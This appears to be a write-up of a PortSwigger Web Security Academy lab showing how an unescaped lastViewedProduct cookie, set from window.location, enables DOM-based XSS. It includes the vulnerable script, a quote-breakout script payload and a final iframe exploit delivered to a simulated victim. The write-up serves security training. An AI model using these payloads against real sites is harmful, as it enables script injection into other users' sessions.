# Lab: DOM-based Cookie Manipulation

![Lab Image](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

## Objective
This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

---

## Analysis

### Initial Observation

- **Inspecting the Source Code of Homepage:**
  - Upon checking the source code of the homepage, no interesting JavaScript vulnerabilities were found.
  ![Source Code of homepage](source_code_of_homepage.png)

- **Exploring the "View Details" Section:**
  - Viewing the "details" section revealed the following JavaScript code:
    ```html
    <script>
        document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure';
    </script>
    <div class="is-linkback">
        <a href="/">Return to list</a>
    </div>
    ```
  ![Source Code of document cookie](source_code_of_document_cookie.png)

- **Last Viewed Product Link:**
  - The "Last viewed product" link in the source code:
    ```html
    <a href='https://0a9200210312412c80c80316008200df.web-security-academy.net/product?productId=1'>Last viewed product</a>
    ```
  ![Source Code of last view product](source_code_of_last_view_product.png)

### Vulnerability Analysis

- **Cookie Manipulation:**
  - The JavaScript code sets a cookie based on the `window.location` value.
  - The cookie is not marked as `HttpOnly`, making it accessible via JavaScript.
  ![HTTP only miss in cookie](http_only_miss_in_cookie.png)

- **Exploitable Cookie Field:**
  - The cookie field can be manipulated to inject malicious payloads.
  - By escaping the single quote and breaking out of the `<a>` tag, we can inject an XSS payload.

### XSS Payload

- **Payload to Inject:**
  ```html
  '><script>print()</script>
  ```
  - This payload escapes the `<a>` tag and injects a `<script>` tag.
  ![XSS PAYLOAD IN COOKIE FIELD](putting_xss_payload_in_cookie_field.png)

- **Triggering the XSS:**
  - Refresh the page and revisit the website to execute the payload.
  ![XSS TRIGGERED](xss_triggered.png)

- **Source Code After Triggering XSS:**
  ![Source code after triggering xss](source_code_after_triggering_xss.png)

---

## Exploitation

### Crafting the Exploit

- **Using the Exploit Server:**
  - Construct an iframe to deliver the payload:
    ```html
    <iframe src="https://url_that_contains_cookie_with_script" onload="this.src='https://url'">
    ```

- **Final Payload:**
  ```html
  <iframe src="https://0a9200210312412c80c80316008200df.web-security-academy.net/product?productId=1&'><script>print()</script>" 
          onload="this.src='https://0a9200210312412c80c80316008200df.web-security-academy.net/product?productId=1'">
  ```
  - The `&` is used before the `'>` because the payload is sent via the URL.
  ![EXPLOIT SERVER PAYLOAD](exploit_server_payload.png)

### Testing the Exploit

- **View Exploit:**
  - Check if the payload executes XSS by viewing the exploit.
  ![View Exploit XSS Triggered](triggering_xss_in_viewExploit.png)

- **Deliver to Victim:**
  - Send the exploit to the victim to solve the lab.
  ![Lab solved](lab_solved.png)

---

## Conclusion
By exploiting the insecure handling of cookies and the lack of `HttpOnly` protection, we successfully triggered a DOM-based XSS vulnerability. This highlights the importance of securing cookies and validating user inputs to prevent such attacks.